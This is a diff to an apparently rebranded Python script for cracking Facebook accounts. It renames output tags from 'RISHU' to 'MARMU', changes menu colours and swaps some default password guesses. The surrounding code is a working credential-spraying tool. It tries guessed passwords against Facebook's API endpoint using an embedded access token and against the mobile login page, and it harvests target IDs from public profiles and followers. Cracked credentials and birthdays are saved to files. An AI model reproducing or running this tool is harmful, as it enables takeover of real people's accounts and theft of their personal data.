@@ -117,13 +117,13 @@ def menu():
 	logo()
 	print"\033[0;97m Name\033[0;92m " +ngentod
 	print
-        print(" \033[0;91m╔═════════════════════════════════╗")
-	print" \033[0;91m(01). \033[0;92mCrack from public Id"
-	print" \033[0;91m(02). \033[0;92mCrack from followers"
-	print" \033[0;91m(03). \033[0;92mCrack name search"
-	print" \033[0;91m(04). \033[0;92mCheck results "
-	print" \033[0;91m(00). \033[0;92m\033[0;97m Remove token"
-	print(" \033[0;91m╚═════════════════════════════════╝")
+        print(" \033[0;93m══════════════🍁═══════════════════")
+	print" \033[0;92m(01). \033[0;96mCrack from public Id"
+	print" \033[0;92m(02). \033[0;96mCrack from followers"
+	print" \033[0;92m(03). \033[0;96mCrack name search"
+	print" \033[0;92m(04). \033[0;96mCheck results "
+	print" \033[0;92m(00). \033[0;96m\033[0;97m Remove token"
+	print(" \033[0;93m════════════🍁════🍁═══════════════")
 	pilih_menu()
 
 def pilih_menu():
@@ -202,12 +202,12 @@ def pilih_menu():
 
 # Tambahan metode nya #
 def anak_memek():
-        print(" \033[0;91m╔════════════════════════════════╗")
+        print(" \033[0;94m═══════════════ MarMu ═════════════════")
 	print ("\n\033[0;92m [ Select the crack method ] \n")
-	print ("\n\033[0;91m (01). \033[0;92mb-api (fast)")
-	print ("\n\033[0;91m (02). \033[0;92mmbasic (normal)")
-	print ("\n\033[0;91m (03). \033[0;92mmobile (slow)")
-	print(" \033[0;91m╚════════════════════════════════╝")
+	print ("\n\033[0;93m (01). \033[0;92m (fast)")
+	print ("\n\033[0;93m (02). \033[0;92m (normal)")
+	print ("\n\033[0;93m (03). \033[0;92m (slow)")
+	print(" \033[0;94m══════════════ Baby Dragon ═════════════")
 	romixyz()
 
 def romixyz():
@@ -227,11 +227,11 @@ def romixyz():
 	
 # Metode api #
 def romi_ganteng():
-	romi = raw_input("\033[0;92m [•] Use manual password? C/A : ")
+	romi = raw_input("\033[0;95m [•] Hack Password Manually or Auto? M/A : ")
 	if romi=='':
 		print ("\033[0;91m [•] choose the right one ") 
 		romi_ganteng()
-	elif romi in['c','C']:
+	elif romi in['m','M']:
 		manualbapi()
 	elif romi in['a','A']:
 		langsungapi()
@@ -269,7 +269,7 @@ def langsungapi():
 				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
 				send=ses.get(api,params=param, headers=kontol)
 				if "access_token" in send.text and "EAAA" in send.text:
-					print '\r \033[0;92m[RISHU-OK√] ' +uid+ ' ◊ ' + pw + '        '
+					print '\r \033[0;92m[MARMU-OK√] ' +uid+ ' ◊ ' + pw + '        '
 					ok.append(uid+' ◊ '+pw)
 					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write(' [√] '+str(uid)+' ◊ '+str(pw)+'\n')
@@ -282,7 +282,7 @@ def langsungapi():
 						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
 						data = s.get(url).json()
 						ttl = data["birthday"]
-						print('\r\033[0;31m [RISHU-CP] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl )
+						print('\r\033[0;31m [MARMU-CP] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl )
 						cp.append(uid+' ◊ '+pw+ ' ◊ ' +ttl )
 						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
 						save.write(' [×] '+str(uid)+' ◊ '+str(pw)+' ◊ '+str(ttl)+'\n')
@@ -291,7 +291,7 @@ def langsungapi():
 					except(KeyError, IOError):
 						ttl = ' '
 					except:pass
-					print ('\r\033[0;31m [RISHU-CP] ' +uid+ ' ◊ ' + pw + '        ')
+					print ('\r\033[0;31m [MARMU-CP] ' +uid+ ' ◊ ' + pw + '        ')
 					cp.append(uid+' ◊ '+pw )
 					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write(' [×] '+str(uid)+' ◊ '+str(pw)+'\n')
@@ -309,12 +309,12 @@ def langsungapi():
 	exit()
 
 def manualbapi():
-	print("\n\033[0;91m [•] example pass : 123456,786786")
+	print("\n\033[0;95m [•] example pass : 123456,222222")
 	pw = raw_input(" \033[0;92m?: password : ").split(",")
 	if len(pw) ==0:
 		exit("\033[0;91m [•] cannot be empty")
 		
-	print("\n \033[0;92m[•] crack started...\n \033[0;91m[•] result time? use 10 second airplane mode\n")
+	print("\n \033[0;93m[•] crack started...\n \033[0;91m[•] result time? use 10 second airplane mode\n")
 	
 	def main(arg):
 		global ok,cp,ua,loop
@@ -364,7 +364,7 @@ def manualbapi():
 					except(KeyError, IOError):
 						ttl = ' '
 					except:pass
-					print '\r\033[0;31m [RISHU-CP] ' +uid+ ' ◊ ' + pw + '        '
+					print '\r\033[0;31m [MARMU-CP] ' +uid+ ' ◊ ' + pw + '        '
 					cp.append(uid+' ◊ '+pw)
 					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write(' [×] '+str(uid)+' ◊ '+str(pw)+'\n')
@@ -383,11 +383,11 @@ def manualbapi():
 	
 # Metode mbasic #
 def romi_gntg():
-	romi = raw_input("\033[0;92m [•] Use manual password? C/A : ")
+	romi = raw_input("\033[0;95m [•] Use manual password? M/A : ")
 	if romi=='':
 		print ("\033[0;91m [•] choose the right one ") 
 		romi_gntg()
-	elif romi in['c','C']:
+	elif romi in['m','M']:
 		manualbasic()
 	elif romi in['a','A']:
 		langsungbasic()
@@ -423,7 +423,7 @@ def langsungbasic():
 					skm.append(nama+"969")
 					skm.append(nama+"007")
 					skm.append(nama+"1500")
-					skm.append("123456")
+					skm.append("969969")
 					skm.append("223344")
 					skm.append("654321")
 					skm.append("528528")
@@ -456,7 +456,7 @@ def langsungbasic():
 					except(KeyError, IOError):
 						ttl = ' '
 					except:pass
-					print '\r\033[0;91m [RISHU-CP] ' +uid+ ' ◊ ' + pw + '        '
+					print '\r\033[0;91m [MARMU-CP] ' +uid+ ' ◊ ' + pw + '        '
 					cp.append(uid+' ◊ '+pw)
 					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write(' [×] '+str(uid)+' ◊ '+str(pw)+'\n')
@@ -474,7 +474,7 @@ def langsungbasic():
 	exit()
 
 def manualbasic():
-	print("\n\033[0;91m [•]  example pass : sayang,123456")
+	print("\n\033[0;91m [•]  example pass : komarmu,123456")
 	pw = raw_input(" \033[0;92m?: password : ").split(",")
 	if len(pw) ==0:
 		exit("\033[0;91m [•] cannot be empty")
@@ -634,7 +634,7 @@ def m_fb():
 				rex = requests.post('https://mobile.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
 				xo = rex.content
 				if 'mobile_logout_button' in xo or 'save-device' in xo:
-					print '\r\033[0;92m [RISHU-OK√] ' +uid+ ' ◊ ' + pw + '        '
+					print '\r\033[0;92m [MARMU-OK√] ' +uid+ ' ◊ ' + pw + '        '
 					ok.append(uid+' ◊ '+pw)
 					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write(' [√] '+str(uid)+' ◊ '+str(pw)+'\n')
@@ -648,7 +648,7 @@ def m_fb():
 						data = s.get(url).json()
 						nama = data['name']
 						ttl = data['birthday'].replace("/","-")
-						print('\r\033[0;91m [RISHU-CP] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl)
+						print('\r\033[0;91m [MARMU-CP] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl)
 						cp.append(uid+' ◊ '+pw+'•'+ttl)
 						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
 						save.write(' [×] '+str(uid)+' ◊ '+str(pw)+' ◊ '+ttl+'\n')
@@ -657,7 +657,7 @@ def m_fb():
 					except(KeyError, IOError):
 						ttl = ' '
 					except:pass
-					print '\r\033[0;91m [RISHU-CP] ' +uid+ ' ◊ ' + pw + '        '
+					print '\r\033[0;91m [MARMU-CP] ' +uid+ ' ◊ ' + pw + '        '
 					cp.append(uid+' ◊ '+pw)
 					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write(' [×] '+str(uid)+' ◊ '+str(pw)+'\n')
